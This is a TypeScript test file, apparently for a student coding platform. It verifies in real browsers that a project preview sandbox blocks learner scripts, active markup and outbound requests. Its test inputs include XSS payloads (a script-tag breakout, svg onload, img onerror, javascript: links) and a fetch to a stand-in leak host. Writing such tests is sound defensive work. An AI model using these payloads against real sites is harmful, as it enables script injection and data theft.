import test from "node:test";
import assert from "node:assert/strict";
import { Script } from "node:vm";
import { chromium } from "@playwright/test";
import { previewDocument } from "../src/components/coding/ProjectPreview";

test("the trusted preview bridge is valid JavaScript and does not interpolate student markup", () => {
  const attack = '</script><script>parent.compromised=true</script><p>雪</p>';
  const document = previewDocument(attack, "body{color:red}", "test-channel", "testnonce", true);
  assert.equal(document.includes(attack), false);
  assert.equal((document.match(/<script /g) ?? []).length, 1);
  const script = document.match(/<script nonce="testnonce">([\s\S]*)<\/script>/)![1]!;
  assert.doesNotThrow(() => new Script(script));
  const focused = previewDocument("<input id=title>", "", "test-channel", "testnonce", true, { target: attack, start: 0, end: 0 });
  assert.equal(focused.includes(attack), false, "Focus metadata cannot close the trusted script element");
});

test("real browser previews block student scripts, active markup and network while retaining accessible controls", async () => {
  const browser = await chromium.launch({ channel: "msedge", headless: true });
  try {
    for (const width of [360, 768, 1280]) {
      const page = await browser.newPage({ viewport: { width, height: 900 } });
      const requests: string[] = [];
      page.on("request", (request) => { if (/https?:/.test(request.url())) requests.push(request.url()); });
      const html = `<h1>雪 Garden counter</h1><script>parent.compromised=true;fetch('https://leak.invalid/secret')</script>
        <svg onload="parent.compromised=true"><script>alert(1)</script></svg>
        <img src="https://leak.invalid/image" onerror="parent.compromised=true" alt="A leaf">
        <form action="https://leak.invalid/post"><label for="name">Plant name</label><input id="name" value="Fern"><button id="grow" onclick="parent.compromised=true">Grow</button></form>
        <a id="unsafe" href="javascript:parent.compromised=true">Project link</a>`;
      const preview = previewDocument(html, "body{background-image:url(https://leak.invalid/css)}", "preview-test", "noncetest", true);
      await page.setContent('<iframe title="Project" sandbox="allow-scripts" style="width:100%;height:700px;border:0"></iframe>');
      await page.evaluate((srcdoc) => {
        (window as unknown as { previewMessages: unknown[] }).previewMessages = [];
        window.addEventListener("message", (event) => (window as unknown as { previewMessages: unknown[] }).previewMessages.push(event.data));
        document.querySelector("iframe")!.srcdoc = srcdoc;
      }, preview);
      const frame = page.frameLocator("iframe");
      await frame.getByRole("heading", { name: "雪 Garden counter" }).waitFor();
      assert.equal(await frame.locator("script").count(), 1);
      assert.equal(await frame.locator("svg,form,iframe,object,embed,[onclick],[onerror],[onload],[href],[src]").count(), 0);
      await frame.getByLabel("Plant name").fill("Rose");
      await frame.getByRole("button", { name: "Grow" }).click();
      await page.waitForFunction(() => (window as unknown as { previewMessages: Array<{ kind: string; target: string }> }).previewMessages.some((message) => message.kind === "interaction" && message.target === "grow"));
      assert.equal(await page.evaluate(() => "compromised" in window), false);
      assert.deepEqual(requests, []);
      await page.close();
    }
  } finally { await browser.close(); }
});

test("inert previews retain snapshot styles and keyboard-operable local links without running learner scripts", async () => {
  const browser = await chromium.launch({ channel: "msedge", headless: true });
  try {
    const page = await browser.newPage({ viewport: { width: 390, height: 900 } });
    const requests: string[] = []; page.on("request", (request) => { if (/https?:/.test(request.url())) requests.push(request.url()); });
    const html = '<html><head><style>.notice{color:#123456;padding:16px;background-color:#ffffff}</style></head><body><h1>Fictional river guide</h1><a href="#evidence">Read the evidence</a><p style="margin-top:900px">Local content</p><h2 id="evidence" class="notice">Evidence notes</h2><script>parent.compromised=true</script></body></html>';
    const preview = previewDocument(html, "", "local-navigation", "localnonce", false);
    await page.setContent('<iframe title="Private guide" sandbox="allow-scripts" style="width:100%;height:700px;border:0"></iframe>');
    await page.evaluate((srcdoc) => { document.querySelector("iframe")!.srcdoc = srcdoc; }, preview);
    const frame = page.frameLocator("iframe"), link = frame.getByRole("link", { name: "Read the evidence" });
    await link.focus(); await link.press("Enter");
    const target = frame.getByRole("heading", { name: "Evidence notes" });
    assert.equal(await target.evaluate((element) => document.activeElement === element), true);
    assert.equal(await target.evaluate((element) => getComputedStyle(element).color), "rgb(18, 52, 86)");
    assert.equal(await target.evaluate((element) => getComputedStyle(element).paddingTop), "16px");
    assert.equal(await page.evaluate(() => "compromised" in window), false);
    assert.deepEqual(requests, []);
  } finally { await browser.close(); }
});

test("evidence navigation forwards only a fixed slot and never a student-selected URL", async () => {
  const browser = await chromium.launch({ channel: "msedge", headless: true });
  try {
    const page = await browser.newPage(), requests: string[] = [];
    page.on("request", (request) => { if (/https?:/.test(request.url())) requests.push(request.url()); });
    const preview = previewDocument('<main><h1>Private evidence</h1><a id="valid" href="#saved-first" data-starliz-evidence="first">Open saved creation</a><a id="bad-slot" href="#saved-first" data-starliz-evidence="https://leak.invalid/foreign">Invalid slot</a><a id="external" href="https://leak.invalid/public" data-starliz-evidence="first">External destination</a><section id="saved-first"><h2>Saved creation</h2></section></main>', "", "evidence-channel", "evidencenonce", false);
    await page.setContent('<iframe title="Evidence project" sandbox="allow-scripts"></iframe>');
    await page.evaluate((srcdoc) => { (window as unknown as { evidenceMessages: unknown[] }).evidenceMessages = []; window.addEventListener("message", (event) => (window as unknown as { evidenceMessages: unknown[] }).evidenceMessages.push(event.data)); document.querySelector("iframe")!.srcdoc = srcdoc; }, preview);
    const frame = page.frameLocator("iframe");
    await frame.locator("#valid").focus(); await frame.locator("#valid").press("Enter");
    await page.waitForFunction(() => (window as unknown as { evidenceMessages: Array<{ kind: string }> }).evidenceMessages.some((message) => message.kind === "evidence"));
    assert.equal(await frame.locator("#bad-slot").getAttribute("data-starliz-evidence"), null);
    assert.equal(await frame.locator("#external").getAttribute("href"), null);
    await frame.locator("#bad-slot").click(); await frame.locator("#external").click();
    const messages = await page.evaluate(() => (window as unknown as { evidenceMessages: Array<{ kind: string }> }).evidenceMessages.filter((message) => message.kind === "evidence"));
    assert.deepEqual(messages, [{ channel: "evidence-channel", kind: "evidence", slot: "first" }]);
    assert.deepEqual(requests, []);
  } finally { await browser.close(); }
});
